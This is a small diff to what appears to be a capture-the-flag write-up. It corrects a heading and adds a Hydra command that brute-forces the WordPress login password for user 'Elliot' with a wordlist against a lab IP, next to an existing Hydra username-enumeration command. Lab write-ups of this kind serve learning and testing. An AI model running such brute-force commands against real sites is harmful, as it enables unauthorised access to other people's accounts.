@@ -40,9 +40,9 @@ WordPress - Hydra input username
 hydra -L fsocity.dic -p test 10.10.114.27 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30
 ```
 
-WordPress - Hydra input username
+WordPress - Hydra input password
 ```shell
-
+hydra -l Elliot -P fsocity.dic 10.10.114.27 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username Elliot is incorrect." -t 30 
 ```
 
 
